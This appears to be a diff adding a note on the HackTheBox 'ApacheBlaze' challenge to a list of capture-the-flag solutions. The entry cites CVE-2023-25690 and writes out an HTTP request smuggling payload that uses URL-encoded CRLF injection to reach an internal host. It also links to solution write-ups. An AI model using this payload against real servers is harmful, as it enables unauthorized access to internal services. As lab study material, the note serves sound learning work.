@@ -48,5 +48,26 @@
 	C. Modify it as you go
     Solution: https://medium.com/@tanish.saxena26/hackthebox-renderquest-cf6c493d7b83
 
+**07 ApacheBlaze:**
+    Link: https://app.hackthebox.com/challenges/ApacheBlaze
+    Hint: CVE-2023–25690 (https://github.com/dhmosfunk/CVE-2023-25690-POC/tree/main#internal-http-request-smuggling-via-header-injection)
 
+    	GET /api/games/click_topia HTTP/1.1
+	Host: dev.apacheblaze.local
+
+
+	GET / HTTP/1.1
+	Host: localhost:1337
+	{
+		Reminder for encoding : 
+
+		\r\n     ->  %0d%0a
+		\r\n\r   ->  %0d%0a%0d
+	}
+	After Url Encoding
+	GET 
+	/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1
+	Host: localhost:1337
+    Solution: https://medium.com/@reinhardt.pwn/hackthebox-challenge-write-up-apacheblaze-a32643f19c45
+    
 
